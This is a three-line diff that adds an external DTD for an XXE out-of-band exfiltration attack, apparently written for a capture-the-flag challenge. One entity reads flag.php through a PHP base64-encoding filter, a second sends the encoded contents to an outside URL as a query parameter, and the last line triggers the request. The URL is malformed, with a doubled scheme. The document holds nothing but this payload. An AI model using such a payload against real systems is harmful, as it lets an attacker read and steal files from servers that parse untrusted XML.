@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
+<!ENTITY % send SYSTEM "http://https://github.com/Swift17-ux/mjau/?data=%file;">
+%send;
